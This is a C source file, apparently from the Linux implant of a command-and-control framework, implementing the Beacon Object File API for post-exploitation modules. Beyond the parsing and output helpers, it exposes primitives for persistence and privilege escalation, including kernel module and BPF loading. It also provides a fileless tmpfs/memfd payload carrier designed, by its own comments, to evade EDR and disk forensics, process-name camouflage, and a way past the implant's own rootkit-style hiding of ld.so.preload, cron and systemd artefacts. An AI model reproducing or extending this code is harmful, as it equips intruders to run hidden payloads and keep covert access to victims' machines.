/// bof_api.c — Linux Beacon API implementation for BOF execution
/// Port of beacon_functions.cpp (Windows) to Linux C with nostdlib

#include "bof_api.h"
#include "crt.h"
#include "types.h"
#include "msgpack.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

/// ────────────────────────────────────────────────────────────────────────────
/// Global state — set by elf_bof.c before calling BOF entry point
/// ────────────────────────────────────────────────────────────────────────────

/// Output accumulator buffer
static buffer_t bof_output_buf;
static int      bof_output_initialized = 0;
static int      bof_output_error_type  = 0;  // 0 = no error, >0 = error code

void bof_output_init(void) {
    if (!bof_output_initialized) {
        buf_init(&bof_output_buf, 4096);
        bof_output_initialized = 1;
    } else {
        buf_reset(&bof_output_buf);
    }
    bof_output_error_type = 0;
}

void bof_output_cleanup(void) {
    if (bof_output_initialized) {
        buf_free(&bof_output_buf);
        bof_output_initialized = 0;
    }
}

/// Get accumulated output (null-terminated)
const char *bof_output_get(int *out_len) {
    if (!bof_output_initialized || bof_output_buf.len == 0) {
        if (out_len) *out_len = 0;
        return "";
    }
    // Ensure null termination
    char zero = '\0';
    buf_append(&bof_output_buf, &zero, 1);
    bof_output_buf.len--;  // don't count the null in length
    if (out_len) *out_len = bof_output_buf.len;
    return (const char *)bof_output_buf.data;
}

int bof_output_get_error(void) {
    return bof_output_error_type;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Endianness swap (for BeaconFormatInt — big-endian encoding)
/// ────────────────────────────────────────────────────────────────────────────

static unsigned int swap_endianness(unsigned int indata) {
    unsigned int testint = 0xaabbccdd;
    unsigned int outint = indata;
    if (((unsigned char *)&testint)[0] == 0xdd) {
        ((unsigned char *)&outint)[0] = ((unsigned char *)&indata)[3];
        ((unsigned char *)&outint)[1] = ((unsigned char *)&indata)[2];
        ((unsigned char *)&outint)[2] = ((unsigned char *)&indata)[1];
        ((unsigned char *)&outint)[3] = ((unsigned char *)&indata)[0];
    }
    return outint;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Data Parser API (CS-compatible)
/// ────────────────────────────────────────────────────────────────────────────

void BeaconDataParse(datap *parser, char *buffer, int size) {
    if (!parser)
        return;
    if (!buffer || size < 4) {
        // ★ 早退前**必须**把 parser 清零（ISS-070）。BOF 里写的是 `datap parser;`
        //   —— 未初始化的栈变量；原来的 `return` 什么都不写，紧接着
        //   BeaconDataExtract 就拿着栈上垃圾指针做 memcpy → agent **段错误**
        //   （内核日志：fault 落在 0x7ffd… 栈区间、故障指令是字节拷贝循环）。
        //   触发路径完全合法：`param_data` 键缺失 → 服务器下发 Args=nil
        //   （pl_main.go:1611 `if ok` 分支即承认这是预期形状）→ elf_bof.c:721
        //   同步路径无守卫地透传 NULL。清零后 length=0 < 4 → Extract 直接回 NULL，
        //   BOF 走"没有参数"的正常分支，不再崩。
        ax_memset(parser, 0, sizeof(*parser));
        return;
    }
    parser->original = buffer;
    parser->buffer   = buffer + 4;
    parser->length   = size - 4;
    parser->size     = size - 4;
}

int BeaconDataInt(datap *parser) {
    if (!parser || parser->length < 4)
        return 0;
    int val = 0;
    ax_memcpy(&val, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

short BeaconDataShort(datap *parser) {
    if (!parser || parser->length < 2)
        return 0;
    short val = 0;
    ax_memcpy(&val, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

int BeaconDataLength(datap *parser) {
    if (!parser)
        return 0;
    return parser->length;
}

/// ★★ 出参契约（ISS-078 家族，**所有返回路径都必须满足**）：
///   `p == NULL`             ⇒ 取不出字段了（没有下一个 / 畸形）—— 调用方应当停止
///   `p != NULL, *size == 0` ⇒ **这一字段是空的**，但后面**还有**字段 —— 可以继续
///   `p != NULL, *size > 0`  ⇒ 正常字段
/// 换句话说 `*size` **永远**被写。这条契约是必需的，因为下面两种"空"都合法可达：
///   ① parser 空 / 剩余 < 4（`param_data` 缺失 ⇒ 服务器发 nil ⇒ args=NULL,size=0，
///      或空串 ⇒ 4 字节 count=0）—— 原来的代码在这里**不写 `*size`**，于是没把
///      size 初始化的调用方读到的是**栈上垃圾**，再拿它当长度去 memcpy（ISS-073 同族）。
///   ② count 头为 0 或某个字段长度声明为 0 —— 返回**非 NULL** 指针 + `*size = 0`。
/// 两者不能混：混了之后"取不出更多字段"与"这个字段是空的"就分不开了。
char *BeaconDataExtract(datap *parser, int *size) {
    if (!parser || parser->length < 4) {
        if (size)
            *size = 0;                  /* ← 早退**也必须**写 *size（契约①） */
        return (char *)0;
    }

    unsigned int length = 0;
    ax_memcpy(&length, parser->buffer, 4);

    /* ★ 畸形：声明的长度超过剩余可读字节。原代码这里直接
     *   `parser->length -= length;` —— `length` 是 **unsigned**，`parser->length`
     *   是 int，做的是无符号运算：一旦 length 大于剩余，结果**下溢**成一个巨大的
     *   正数，游标从此飞到缓冲区之外，后续每一次 Extract 都从野指针读。
     *   （`parser->length >= 4` 已由上面保证，所以 `- 4` 不会下溢。）
     * 归零 + 回 NULL ⇒ 调用方 `if (!p) break;` 自然收场，游标停在原地不再前进。 */
    if (length > (unsigned int)(parser->length - 4)) {
        if (size)
            *size = 0;
        return (char *)0;
    }

    parser->length -= 4;
    parser->buffer += 4;

    char *outdata = parser->buffer;

    parser->length -= (int)length;
    parser->buffer += (int)length;

    if (size)
        *size = (int)length;
    return outdata;                     /* length == 0 也返回指针（契约②），
                                         * 让调用方能继续往后取字段 */
}

/// ────────────────────────────────────────────────────────────────────────────
/// Output API
/// ────────────────────────────────────────────────────────────────────────────

void BeaconOutput(int type, const char *data, int len) {
    if (!data || !bof_output_initialized)
        return;

    if (type == CALLBACK_ERROR) {
        bof_output_error_type = CALLBACK_ERROR;
    }

    if (len > 0) {
        buf_append(&bof_output_buf, data, len);
    } else {
        // If len == 0, treat data as null-terminated string
        int slen = (int)ax_strlen(data);
        buf_append(&bof_output_buf, data, slen);
    }
}

void BeaconPrintf(int type, const char *fmt, ...) {
    if (!fmt || !bof_output_initialized)
        return;

    if (type == CALLBACK_ERROR) {
        bof_output_error_type = CALLBACK_ERROR;
    }

    // Fixed heap buffer, single pass. Avoids BOTH failure modes:
    //  - the original NULL-probe two-pass (ax_vsnprintf has no NULL/0
    //    support; %s wrote to NULL and crashed the agent)
    //  - a 4KB stack frame (GCC13 -Os + distro -fstack-clash-protection
    //    hangs cc1 on it - observed 13+ min compile spin)
    char *tmp = (char *)ax_malloc(4096);
    if (!tmp)
        return;

    va_list args;
    va_start(args, fmt);
    int needed = ax_vsnprintf(tmp, 4095, fmt, args);
    va_end(args);

    if (needed > 0) {
        if (needed > 4095)
            needed = 4095;
        buf_append(&bof_output_buf, tmp, needed);
    }
    ax_free(tmp);
}


/// ────────────────────────────────────────────────────────────────────────────
/// Format API
/// ────────────────────────────────────────────────────────────────────────────

void BeaconFormatAlloc(formatp *format, int maxsz) {
    if (!format)
        return;
    format->original = (char *)ax_malloc(maxsz);
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = maxsz;
}

void BeaconFormatReset(formatp *format) {
    if (!format || !format->original)
        return;
    ax_memset(format->original, 0, format->size);
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatAppend(formatp *format, const char *text, int len) {
    if (!format || !text)
        return;
    if (format->length + len > format->size)
        return;
    ax_memcpy(format->buffer, text, len);
    format->buffer += len;
    format->length += len;
}

void BeaconFormatPrintf(formatp *format, const char *fmt, ...) {
    if (!format || !fmt)
        return;

    va_list args;
    va_start(args, fmt);
    int remaining = format->size - format->length;
    if (remaining <= 0) {
        va_end(args);
        return;
    }
    int written = ax_vsnprintf(format->buffer, remaining, fmt, args);
    va_end(args);

    if (written > 0) {
        format->length += written;
        format->buffer += written;
    }
}

char *BeaconFormatToString(formatp *format, int *size) {
    if (!format)
        return (char *)0;
    if (size)
        *size = format->length;
    return format->original;
}

void BeaconFormatFree(formatp *format) {
    if (!format)
        return;
    if (format->original) {
        ax_memset(format->original, 0, format->size);
        ax_free(format->original);
    }
    format->original = (char *)0;
    format->buffer   = (char *)0;
    format->length   = 0;
    format->size     = 0;
}

void BeaconFormatInt(formatp *format, int value) {
    if (!format)
        return;
    if (format->length + 4 > format->size)
        return;
    unsigned int outdata = swap_endianness((unsigned int)value);
    ax_memcpy(format->buffer, &outdata, 4);
    format->length += 4;
    format->buffer += 4;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Utility APIs
/// ────────────────────────────────────────────────────────────────────────────

int BeaconIsAdmin(void) {
    return (sys_geteuid() == 0) ? 1 : 0;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Async BOF context — set by elf_bof.c before calling BOF entry in async thread
/// ────────────────────────────────────────────────────────────────────────────

/// Opaque pointer to async_bof_arg_t (from elf_bof.c)
/// Set to non-NULL only during async BOF execution, checked by BOF APIs.
/// Thread safety: only one async BOF calls elf_bof_execute at a time per thread,
/// and the main thread's sync BOFs run serially, so no race on this pointer.
static volatile void *g_async_bof_ctx = (void *)0;
static volatile int   g_async_bof_stop_fd = -1;  // read-end of stop_pipe

void bof_set_async_ctx(void *ctx, int stop_fd) {
    g_async_bof_ctx = ctx;
    g_async_bof_stop_fd = stop_fd;
}

void bof_clear_async_ctx(void) {
    g_async_bof_ctx = (void *)0;
    g_async_bof_stop_fd = -1;
}

int bof_is_async(void) {
    return g_async_bof_ctx != (void *)0;
}

void BeaconWakeup(void) {
    // No-op on Linux: async BOF has its own C2 connection,
    // output is sent directly without needing to wake the main thread.
}

int BeaconGetStopJobEvent(void) {
    // Returns the read-end fd of the stop pipe.
    // BOF can poll() this fd to check if kill was requested.
    // Returns -1 if not in an async BOF context.
    return (int)g_async_bof_stop_fd;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Adaptix extensions
/// ────────────────────────────────────────────────────────────────────────────

void AxDownloadMemory(char *filename, char *data, int len) {
    // For now, encode as text output (full implementation would use TsDownloadSave)
    if (!bof_output_initialized)
        return;

    char header[256];
    ax_snprintf(header, sizeof(header), "[download] %s (%d bytes)\n", filename ? filename : "unknown", len);
    int hlen = (int)ax_strlen(header);
    buf_append(&bof_output_buf, header, hlen);

    // TODO: implement proper file download via separate channel when needed
}

/// ────────────────────────────────────────────────────────────────────────────
/// Linux system primitives — exposed to BOFs via symbol table
/// ────────────────────────────────────────────────────────────────────────────

// File I/O wrappers
int AxOpenFile(const char *path, int flags, int mode) {
    if (!path) return -1;
    return sys_open(path, flags, mode);
}

int AxCloseFile(int fd) {
    if (fd < 0) return -1;
    return sys_close(fd);
}

int AxReadFile(int fd, void *buf, int count) {
    if (fd < 0 || !buf || count <= 0) return -1;
    return (int)sys_read(fd, buf, (size_t)count);
}

int AxWriteFile(int fd, const void *buf, int count) {
    if (fd < 0 || !buf || count <= 0) return -1;
    size_t written = 0;
    while (written < (size_t)count) {
        long w = sys_write(fd, (const uint8_t *)buf + written, (size_t)count - written);
        if (w <= 0) return (int)written;
        written += (size_t)w;
    }
    return (int)written;
}

// Convenience: read entire file into malloc'd buffer
int AxReadFileToBuffer(const char *path, char **out_buf, int max_size) {
    if (!path || !out_buf) return -1;
    if (max_size <= 0) max_size = 1048576;  // 1 MB default

    int fd = sys_open(path, 0 /* O_RDONLY */, 0);
    if (fd < 0) return -1;

    char *buf = (char *)ax_malloc(max_size + 1);
    if (!buf) {
        sys_close(fd);
        return -1;
    }

    int total = 0;
    while (total < max_size) {
        int n = (int)sys_read(fd, buf + total, max_size - total);
        if (n <= 0) break;
        total += n;
    }
    sys_close(fd);

    buf[total] = '\0';
    *out_buf = buf;
    return total;
}

// ★★ 读**真身**：绕开 redact.c 的读时抹平（ISS-076 的单点实现）
//
// 为什么必须存在：redact.c 会把**我们自己的产物**在读时抹掉 ——
// /etc/ld.so.preload 里我们那一行的 .so 路径、/proc/modules 里我们的模块名、
// hide_names 里登记过的类A 文件（/etc/cron.d/<job>、/etc/systemd/system/<unit>）
// 整块抹平。于是任何"读回来判断 / 再写回去"的代码都会**成功地什么
// 都没做**：
//   · ld_preload_install 的 already-present 检查永远不命中 → 重复追加；
//   · 更糟的是它把**读回来的假内容（空格）当作"已有条目"写回文件**
//     → 亲手毁掉自己的产物（ISS-076，实测）。
//
// redact 的豁免判据 = 「本进程刚用 access(2) 探测过它」**AND**「这条 open 带
// O_CLOEXEC」—— 那正是 ld.so 开 preload 的形态（见 redact.c 头注）。顺序不能反：
// 探测必须在 open **之前**，且中间不能插别的 open —— 旗标在 open 返回时被
// **一次性消费**。
//
// 为什么收在**一个**函数里而不是每个 BOF 各写一遍：同一条不变量落在
// N 个点上 ⇒ 必须是「表 + 断言」，不能是「N 处手写」（ISS-071/072 就是这么
// 漏掉 ko_load 与 ld_preload_install 的）。evacuate.c 原先自带一份 ax_read_real，
// 现在也走这里。
//
// ⚠ 只给**我们自己的工具**用。对手要伪造它得先 access(R_OK) 再
// open(O_CLOEXEC)，而那正是加载器的形态 —— 这条通道无法只靠"看起来像工具"骗过。
#define AX_REAL_O_CLOEXEC 0x80000

int AxReadFileReal(const char *path, char **out_buf, int max_size) {
    if (!path || !out_buf) return -1;
    if (max_size <= 0) max_size = 1048576;

    *out_buf = (char *)0;
    /* ① 探测：打旗标。失败（文件不存在）也无妨 —— 接下来的 open 会同样失败。 */
    sys_access(path, 4 /* R_OK */);
    /* ② 消费：带 O_CLOEXEC 的 open 把旗标一次性用掉。
     * 这两行与下面 AxReadFileToBuffer 的**唯一**差别 —— 对比着读就能看出豁免靠什么。 */
    int fd = sys_open(path, 0 /* O_RDONLY */ | AX_REAL_O_CLOEXEC, 0);
    if (fd < 0) return -1;

    char *buf = (char *)ax_malloc(max_size + 1);
    if (!buf) { sys_close(fd); return -1; }

    int total = 0;
    while (total < max_size) {
        int n = (int)sys_read(fd, buf + total, max_size - total);
        if (n <= 0) break;
        total += n;
    }
    sys_close(fd);

    buf[total] = '\0';
    *out_buf = buf;
    return total;
}

// File stat wrapper
int AxFileStat(const char *path, unsigned int *out_mode, long *out_size,
               unsigned int *out_uid, unsigned int *out_gid) {
    if (!path) return -1;
    struct linux_stat st;
    int ret = sys_stat(path, &st);
    if (ret != 0) return -1;
    if (out_mode) *out_mode = st.st_mode;
    if (out_size) *out_size = st.st_size;
    if (out_uid)  *out_uid  = st.st_uid;
    if (out_gid)  *out_gid  = st.st_gid;
    return 0;
}

// Directory listing
int AxOpenDir(const char *path) {
    if (!path) return -1;
    return sys_open(path, 0x10000 /* O_RDONLY | O_DIRECTORY */, 0);
}

int AxReadDir(int fd, void *buf, int bufsize) {
    if (fd < 0 || !buf || bufsize <= 0) return -1;
    return sys_getdents64(fd, buf, (unsigned int)bufsize);
}

// Memory
void *AxMalloc(int size) {
    if (size <= 0) return (void *)0;
    return ax_malloc((size_t)size);
}

void AxFree(void *ptr) {
    if (ptr) ax_free(ptr);
}

void *AxMemset(void *s, int c, int n) {
    if (!s || n <= 0) return s;
    return ax_memset(s, c, (size_t)n);
}

void *AxMemcpy(void *dst, const void *src, int n) {
    if (!dst || !src || n <= 0) return dst;
    return ax_memcpy(dst, src, (size_t)n);
}

// String operations
int AxStrlen(const char *s) {
    if (!s) return 0;
    return (int)ax_strlen(s);
}

int AxStrcmp(const char *a, const char *b) {
    if (!a || !b) return -1;
    return ax_strcmp(a, b);
}

int AxStrncmp(const char *a, const char *b, int n) {
    if (!a || !b || n <= 0) return -1;
    return ax_strncmp(a, b, (size_t)n);
}

char *AxStrcpy(char *dst, const char *src) {
    if (!dst || !src) return dst;
    return ax_strcpy(dst, src);
}

char *AxStrncpy(char *dst, const char *src, int n) {
    if (!dst || !src || n <= 0) return dst;
    return ax_strncpy(dst, src, (size_t)n);
}

char *AxStrcat(char *dst, const char *src) {
    if (!dst || !src) return dst;
    return ax_strcat(dst, src);
}

char *AxStrstr(const char *haystack, const char *needle) {
    if (!haystack || !needle) return (char *)0;
    return ax_strstr(haystack, needle);
}

char *AxStrchr(const char *s, int c) {
    if (!s) return (char *)0;
    return ax_strchr(s, c);
}

// Formatted output
int AxSnprintf(char *buf, int size, const char *fmt, ...) {
    if (!buf || !fmt || size <= 0) return 0;
    va_list args;
    va_start(args, fmt);
    int ret = ax_vsnprintf(buf, (size_t)size, fmt, args);
    va_end(args);
    return ret;
}

// Process info
int AxGetPid(void) {
    return sys_getpid();
}

int AxGetUid(void) {
    return sys_getuid();
}

int AxGetEuid(void) {
    return sys_geteuid();
}

// getcwd
int AxGetCwd(char *buf, int size) {
    if (!buf || size <= 0) return -1;
    return sys_getcwd(buf, (size_t)size);
}

// getenv via /proc/self/environ
int AxGetEnv(const char *name, char *out_buf, int out_size) {
    if (!name || !out_buf || out_size <= 0) return -1;

    char *env_data = (char *)0;
    int env_len = AxReadFileToBuffer("/proc/self/environ", &env_data, 65536);
    if (env_len <= 0 || !env_data) return -1;

    int name_len = (int)ax_strlen(name);
    int found = -1;

    // /proc/self/environ entries are null-separated
    int pos = 0;
    while (pos < env_len) {
        char *entry = env_data + pos;
        int entry_len = 0;
        while (pos + entry_len < env_len && entry[entry_len] != '\0')
            entry_len++;

        // Check if entry starts with "name="
        if (entry_len > name_len + 1 &&
            ax_strncmp(entry, name, name_len) == 0 &&
            entry[name_len] == '=') {
            char *val = entry + name_len + 1;
            int val_len = entry_len - name_len - 1;
            if (val_len >= out_size) val_len = out_size - 1;
            ax_memcpy(out_buf, val, val_len);
            out_buf[val_len] = '\0';
            found = val_len;
            break;
        }

        pos += entry_len + 1;  // skip null separator
    }

    ax_free(env_data);
    return found;
}

/// ────────────────────────────────────────────────────────────────────────────
/// Symbol resolution table — used by elf_bof.c
/// ────────────────────────────────────────────────────────────────────────────

// Stack-protector shims referenced by the table below. The canary lives
// here as a tentative definition (initialized further down) so the table
// can take its address; bof_stack_chk_fail is defined after the table.
static unsigned long bof_stack_chk_guard;
void bof_stack_chk_fail(void);

typedef struct {
    const char *name;
    void       *func;
} bof_api_entry_t;

static bof_api_entry_t bof_api_table[] = {
    // Data Parser
    {"BeaconDataParse",      (void *)BeaconDataParse},
    {"BeaconDataInt",        (void *)BeaconDataInt},
    {"BeaconDataShort",      (void *)BeaconDataShort},
    {"BeaconDataLength",     (void *)BeaconDataLength},
    {"BeaconDataExtract",    (void *)BeaconDataExtract},

    // Output
    {"BeaconOutput",         (void *)BeaconOutput},
    {"BeaconPrintf",         (void *)BeaconPrintf},

    // Format
    {"BeaconFormatAlloc",    (void *)BeaconFormatAlloc},
    {"BeaconFormatReset",    (void *)BeaconFormatReset},
    {"BeaconFormatAppend",   (void *)BeaconFormatAppend},
    {"BeaconFormatPrintf",   (void *)BeaconFormatPrintf},
    {"BeaconFormatToString", (void *)BeaconFormatToString},
    {"BeaconFormatFree",     (void *)BeaconFormatFree},
    {"BeaconFormatInt",      (void *)BeaconFormatInt},

    // Utility
    {"BeaconIsAdmin",        (void *)BeaconIsAdmin},

    // Async BOF
    {"BeaconWakeup",         (void *)BeaconWakeup},
    {"BeaconGetStopJobEvent",(void *)BeaconGetStopJobEvent},

    // Adaptix
    {"AxDownloadMemory",     (void *)AxDownloadMemory},

    // Linux system primitives
    {"AxAccess",             (void *)AxAccess},
    {"AxOpenFile",           (void *)AxOpenFile},
    {"AxCloseFile",          (void *)AxCloseFile},
    {"AxReadFile",           (void *)AxReadFile},
    {"AxReadFileToBuffer",   (void *)AxReadFileToBuffer},
    {"AxReadFileReal",       (void *)AxReadFileReal},
    {"AxFileStat",           (void *)AxFileStat},
    {"AxOpenDir",            (void *)AxOpenDir},
    {"AxReadDir",            (void *)AxReadDir},
    {"AxMalloc",             (void *)AxMalloc},
    {"AxFree",               (void *)AxFree},
    {"AxMemset",             (void *)AxMemset},
    {"AxMemcpy",             (void *)AxMemcpy},
    {"AxStrlen",             (void *)AxStrlen},
    {"AxStrcmp",             (void *)AxStrcmp},
    {"AxStrncmp",            (void *)AxStrncmp},
    {"AxStrcpy",             (void *)AxStrcpy},
    {"AxStrncpy",            (void *)AxStrncpy},
    {"AxStrcat",             (void *)AxStrcat},
    {"AxStrstr",             (void *)AxStrstr},
    {"AxStrchr",             (void *)AxStrchr},
    {"AxSnprintf",           (void *)AxSnprintf},
    {"AxGetPid",             (void *)AxGetPid},
    {"AxGetUid",             (void *)AxGetUid},
    {"AxGetEuid",            (void *)AxGetEuid},
    {"AxGetCwd",             (void *)AxGetCwd},
    {"AxGetEnv",             (void *)AxGetEnv},

    // Privileged syscall primitives
    {"AxExit",               (void *)AxExit},
    {"AxMkdir",              (void *)AxMkdir},
    {"AxFileTimes",          (void *)AxFileTimes},
    {"AxWriteFile",          (void *)AxWriteFile},
    {"AxFork",               (void *)AxFork},
    {"AxWaitPid",            (void *)AxWaitPid},
    {"AxMemfdCreate",        (void *)AxMemfdCreate},
    {"AxMemfdCreateRandom",  (void *)AxMemfdCreateRandom},
    {"AxTmpfsCarrier",       (void *)AxTmpfsCarrier},
    {"AxExecFd",             (void *)AxExecFd},
    {"AxUtimensat",          (void *)AxUtimensat},
    {"AxChmod",              (void *)AxChmod},
    {"AxFinitModule",        (void *)AxFinitModule},
    {"AxBpf",                (void *)AxBpf},
    {"AxPerfEventOpen",      (void *)AxPerfEventOpen},
    {"AxIoctl",              (void *)AxIoctl},
    {"AxUnlink",             (void *)AxUnlink},
    {"AxSymlink",            (void *)AxSymlink},
    // Detached spawn primitives (spawn_detached.c): session split, fd hygiene,
    // caller-supplied argv (argv[0] camouflage), CSPRNG for randomised names.
    {"AxSetsid",             (void *)AxSetsid},
    {"AxDup2",               (void *)AxDup2},
    {"AxPipe",               (void *)AxPipe},
    {"AxExecFdArgv",         (void *)AxExecFdArgv},
    {"AxGetRandom",          (void *)AxGetRandom},

    // Stack protector support: BOFs compiled with default gcc flags
    // (-fstack-protector-strong on Ubuntu) reference these two symbols.
    // __stack_chk_guard resolves to a real agent global so the canary
    // value is consistent between function entry and exit.
    {"__stack_chk_guard",    (void *)&bof_stack_chk_guard},
    {"__stack_chk_fail",     (void *)bof_stack_chk_fail},

    // Sentinel
    // G7 闭环（持久化 BOF 自动登记 hide_names）
    {"AxSetBpfPin",          (void *)AxSetBpfPin},
    {"AxPinRegAdd",          (void *)AxPinRegAdd},
    {"AxPinRegCount",        (void *)AxPinRegCount},
    {"AxPinRegGet",          (void *)AxPinRegGet},
    {"AxPinRegDirent",       (void *)AxPinRegDirent},
    {"AxPinRegDirentPin",    (void *)AxPinRegDirentPin},
    {"AxIdRegAdd",           (void *)AxIdRegAdd},
    {"AxIdRegCount",         (void *)AxIdRegCount},
    {"AxIdRegSink",          (void *)AxIdRegSink},
    {"AxIdRegSinkPin",       (void *)AxIdRegSinkPin},
    {"AxHideNameAdd",        (void *)AxHideNameAdd},
    {"AxHideNameDel",        (void *)AxHideNameDel},
    {"AxHidePinOpen",        (void *)AxHidePinOpen},
    {"AxHideFdAdd",          (void *)AxHideFdAdd},
    {"AxHideFdDel",          (void *)AxHideFdDel},
    {"AxHideFdClose",        (void *)AxHideFdClose},

    {(const char *)0, (void *)0}
};

/// ────────────────────────────────────────────────────────────────────────────
/// Privileged syscall primitives — for persistence / privesc BOFs
/// ────────────────────────────────────────────────────────────────────────────

// Canary value shared with stack-protected BOFs. A fixed value is fine:
// the BOF copies it at function entry and compares at exit — consistency
// is what matters, not secrecy (the agent is not a hardened libc host).
static unsigned long bof_stack_chk_guard = 0x00DEAD00BEEFCAFEUL; // tentative decl above

// Stack-canary failure hook for BOFs compiled with -fstack-protector-*.
// Runs inside the BOF thread: report through the BOF output channel, then
// terminate ONLY this thread (CLONE_THREAD) — never the whole agent.
void bof_stack_chk_fail(void) {
    BeaconPrintf(CALLBACK_ERROR, "[-] BOF stack canary corrupted (stack buffer overflow detected)");
    raw_syscall1(__NR_exit, 1);
    __builtin_unreachable();
}

void AxExit(int status) {
    sys_exit_group(status);
}

int AxMkdir(const char *path, int mode) {
    if (!path) return -1;
    return sys_mkdir(path, mode);
}

int AxFileTimes(const char *path,
                long *atime_sec, long *atime_nsec,
                long *mtime_sec, long *mtime_nsec) {
    if (!path) return -1;
    struct linux_stat st;
    if (sys_stat(path, &st) != 0) return -1;
    if (atime_sec) *atime_sec = (long)st.st_atime_sec;
    if (atime_nsec) *atime_nsec = (long)st.st_atime_nsec;
    if (mtime_sec) *mtime_sec = (long)st.st_mtime_sec;
    if (mtime_nsec) *mtime_nsec = (long)st.st_mtime_nsec;
    return 0;
}

int AxFork(void) {
    return sys_fork();
}

int AxWaitPid(int pid, int *wstatus) {
    int status = 0;
    long r = sys_wait4(pid, &status, 0, (void *)0);
    if (wstatus) *wstatus = status;
    return (int)r;
}

int AxMemfdCreate(const char *name) {
    if (!name) return -1;
    return sys_memfd_create(name, 0);
}

/// Random "m<8hex>" into out (needs >= 10 bytes).  Shared by the memfd and the
/// tmpfs carrier so the name generator exists once; no constant substring a
/// defender can grep for in /proc/*/maps.  getrandom is the only source; if it
/// is unavailable the pid-derived fallback still avoids a fixed name.
static void ax_rand_name(char *out) {
    unsigned char r[4];
    const char *hex = "0123456789abcdef";
    if (sys_getrandom(r, 4, 0) != 4) {
        int p = sys_getpid();
        r[0] = (unsigned char)p;          r[1] = (unsigned char)(p >> 8);
        r[2] = (unsigned char)(p >> 16);  r[3] = (unsigned char)(p >> 24);
    }
    out[0] = 'm';
    for (int i = 0; i < 4; i++) {
        out[1 + i * 2] = hex[(r[i] >> 4) & 0xf];
        out[2 + i * 2] = hex[r[i] & 0xf];
    }
    out[9] = '\0';
}

int AxMemfdCreateRandom(int flags) {
    char name[12];
    ax_rand_name(name);
    return sys_memfd_create(name, (unsigned int)flags);
}

// fcntl 常量（asm-generic ABI：x86_64 与 aarch64 同值）
#define AX_O_RDWR     02
#define AX_O_CREAT    0100
#define AX_O_EXCL     0200
#define AX_O_CLOEXEC  02000000

/// ── 无盘可执行载体：tmpfs 文件，建完立刻 unlink（P1-b，方案 §3.4 / A5·B5·B6）──
/// 内核把 memfd 的 /proc/<pid>/{exe,maps,fd} 名**硬编码**成 "/memfd:<name>"。
/// 「这是 memfd」本身就是一级 fileless 执行 IOC（EDR 规则、内存取证插件直接
/// 匹配它），随机化后缀只能躲掉"名字固定"，躲不掉"是 memfd"。换成 tmpfs 文件：
///   · 显示 "<dir>/.m<8hex> (deleted)" —— 与"任何删掉自己的临时文件"同形
///   · tmpfs 是内存文件系统 → 无盘属性与 memfd 相同（断电即失，不留块设备痕迹）
///   · 不再产生 memfd_create 系统调用（audit / eBPF EDR 的独立触发点）
/// *out_rfd 是**第二个独立打开的只读 fd**（独立 f_pos）：execve 失败时内核已把
/// 执行 fd 的偏移推过，复用同一个 fd 读不回完整载荷。调用方不需要回退时传 NULL。
/// 返回执行用 fd —— 一律 CLOEXEC：AxExecFd/AxExecFdArgv 走
/// execve("/proc/self/fd/N")，路径解析发生在内核关闭 CLOEXEC fd **之前**，所以
/// execve 照常成功，而 fd 不会留给载荷（否则 /proc/<载荷pid>/fd 里明摆着一个
/// "(deleted)" 的匿名可执行文件 —— B6）。<3 = 拿不到 tmpfs 载体，调用方自行
/// 退回 AxMemfdCreateRandom。
///
/// ⚠ 执行用的 fd 必须是**只读**的，写端要在返回前关掉 —— 这不是卫生问题，是能不能跑的问题：
///   内核 do_open_execat 对 i_writecount>0 的 inode 直接回 **ETXTBSY（"Text file busy"）**。
///   **memfd 恰好不受这条约束**（所以照抄 memfd 的"拿 O_RDWR fd 直接 exec"必然踩坑），
///   而普通 tmpfs 文件受。实测四组对照（同一台机、同一内核）：
///       memfd  + 写端开着        → execve OK
///       tmpfs  + 写端开着        → execve ETXTBSY
///       tmpfs  + 只读 fd、写端仍开 → execve ETXTBSY   ← 说明挡住的是**inode 的写计数**，不是 fd 的读法
///       tmpfs  + 写端已关、只留读端 → execve OK
///   更要命的是踩这个坑**没有任何提示**：调用方只会看到 execve 失败而退回 memfd，
///   表面照常起载荷，隐匿性却悄悄降级（P1-b 首轮部署的实测结果）。
int AxTmpfsCarrier(const void *data, int len, int *out_rfd) {
    // 只认**约定必为 tmpfs** 的目录。刻意不含 /tmp、/var/tmp：很多发行版不把它们
    // 单独挂成 tmpfs（本项目靶机就没有 —— /proc/mounts 里无 /tmp 条目，说明它在
    // 根文件系统上）。往磁盘写完再 unlink，数据仍留在空闲块里、可取证恢复，
    // S1「磁盘零残留」直接不过。宁可用纯内存的 memfd 回退，也不碰可能是磁盘的目录。
    static const char *dirs[] = { "/dev/shm", "/run/shm" };
    if (out_rfd) *out_rfd = -1;

    for (unsigned i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++) {
        char p[192], nm[12];
        ax_rand_name(nm);
        if (ax_snprintf(p, (int)sizeof(p), "%s/.%s", dirs[i], nm) <= 0) continue;

        int wfd = sys_open(p, AX_O_RDWR | AX_O_CREAT | AX_O_EXCL | AX_O_CLOEXEC, 0700);
        if (wfd < 3) continue;                 // 目录不存在 / 不可写 / 名字撞了
        if (len > 0 && sys_write(wfd, data, (size_t)len) != len) {
            sys_close(wfd); sys_unlink(p); continue;
        }
        // 写完之后立刻改拿只读 fd：执行用 efd，回退读用 rfd（两次独立 open → 独立 f_pos）
        int efd = sys_open(p, AX_O_CLOEXEC, 0);           // O_RDONLY == 0
        int rfd = out_rfd ? sys_open(p, AX_O_CLOEXEC, 0) : -1;
        sys_close(wfd);                                   // 关掉写端：inode 写计数归零，才 exec 得动
        sys_unlink(p);                                    // 名字到此为止
        if (efd < 3 || (out_rfd && rfd < 3)) {            // 拿不到读端 → 换下一条目录
            if (efd >= 3) sys_close(efd);
            if (rfd >= 3) sys_close(rfd);
            continue;
        }
        if (out_rfd) *out_rfd = rfd;
        return efd;
    }
    return -1;
}

/// Build "/proc/self/fd/<fd>" into out (caller guarantees >= 40 bytes).
